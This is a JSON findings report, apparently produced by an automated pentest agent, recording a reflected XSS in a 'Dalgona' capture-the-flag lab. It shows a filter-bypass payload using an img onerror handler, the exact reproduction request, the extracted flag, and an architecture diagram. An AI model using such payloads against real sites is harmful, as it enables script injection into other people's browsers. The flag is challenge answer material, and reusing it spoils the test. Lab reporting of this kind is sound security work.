@@ -1,0 +1,32 @@
+{
+  "meta": {
+    "created": "2026-04-12T21:29:05.382598+00:00",
+    "target": ""
+  },
+  "findings": [
+    {
+      "id": "9529d47d-a287-4ee3-8ffa-2d6d04c5b621",
+      "timestamp": "2026-04-12T21:29:05.382475+00:00",
+      "title": "Reflected XSS - Filter Bypass via Double Quotes",
+      "severity": "critical",
+      "target": "http://172.17.0.1:34871/page?name=<img src=x onerror=alert(\"XSS\")>",
+      "description": "The /page endpoint reflects the 'name' GET parameter without sufficient sanitization. A blacklist filter blocks 'script' keywords and single quotes (') but does NOT block double quotes. By using double quotes in the alert payload, the XSS filter is bypassed. The injected payload executes in the context after the closing > of the input tag. CTF FLAG EXTRACTED.",
+      "evidence": "Payload: <img src=x onerror=alert(\"XSS\")>\nURL: http://172.17.0.1:34871/page?name=%3Cimg+src%3Dx+onerror%3Dalert%28%22XSS%22%29%3E\n\nResponse:\nCongratulations!\nHere is the flag: flag{6a800548-42a6-4dcb-ab24-5d55c2e040e0}",
+      "tool_used": "http_request",
+      "cve": "",
+      "reproduction": {
+        "type": "http",
+        "command": "GET /page?name=%3Cimg+src%3Dx+onerror%3Dalert%28%22XSS%22%29%3E HTTP/1.1\nHost: 172.17.0.1:34871",
+        "expected": "flag{6a800548-42a6-4dcb-ab24-5d55c2e040e0} in response body"
+      }
+    }
+  ],
+  "diagrams": [
+    {
+      "id": "2a35ef4e-a7dd-4a5e-9327-06b2e5a87ba6",
+      "timestamp": "2026-04-12T21:29:17.004248+00:00",
+      "title": "Dalgona XSS Challenge - Application Architecture",
+      "mermaid": "flowchart TD\n  Browser[\"Browser / Attacker\"] --> Home[\"GET / - Home Page\"]\n  Home --> PageLink[\"Link to /page\"]\n  Browser --> Page[\"GET /page?name=PAYLOAD\"]\n  Page --> Filter[\"Filter: blocks 'script', single quotes\"]\n  Filter -- blocked --> FailMsg[\"Failed! Try again!\"]\n  Filter -- bypass with double quotes --> XSSExec[\"XSS Executes: alert('XSS')\"]\n  XSSExec --> Flag[\"flag{6a800548-42a6-4dcb-ab24-5d55c2e040e0}\"]\n  Page --> StaticAssets[\"static/ CSS, images\"]\n"
+    }
+  ]
+}
